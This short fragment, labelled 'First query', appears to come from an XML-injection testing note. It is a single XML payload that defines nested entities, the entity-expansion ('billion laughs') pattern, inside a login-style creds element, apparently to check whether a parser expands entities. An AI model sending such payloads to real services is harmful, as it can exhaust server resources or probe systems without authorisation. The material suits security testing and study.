First query:

```
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World ">
  <!ENTITY t1 "&bar;&bar;&bar;&bar;&bar;&bar;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<creds>
  <user>Hello &t2;</user>
  <pass>mypass</pass>
</creds>
```
